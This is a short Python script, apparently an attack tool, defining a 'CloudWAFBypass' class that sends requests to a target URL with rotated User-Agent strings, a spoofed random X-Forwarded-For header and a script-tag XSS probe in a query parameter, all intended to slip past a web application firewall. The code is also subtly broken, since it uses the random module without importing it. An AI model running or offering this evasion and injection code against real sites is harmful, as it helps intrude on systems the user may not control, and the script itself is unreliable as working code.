import requests

class CloudWAFBypass:
    def __init__(self, target_url):
        self.target_url = target_url

    def bypass_waf(self):
        headers = self._generate_random_headers()
        payload = self._generate_payload()
        response = requests.get(self.target_url, headers=headers, params={"q": payload})
        return response.text

    def _generate_random_headers(self):
        user_agents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36"]
        return {
            "User-Agent": random.choice(user_agents),
            "X-Forwarded-For": self._random_ip()
        }

    def _random_ip(self):
        return '.'.join(str(random.randint(0, 255)) for _ in range(4))

    def _generate_payload(self):
        return "<script>alert('WAF Bypass')</script>"
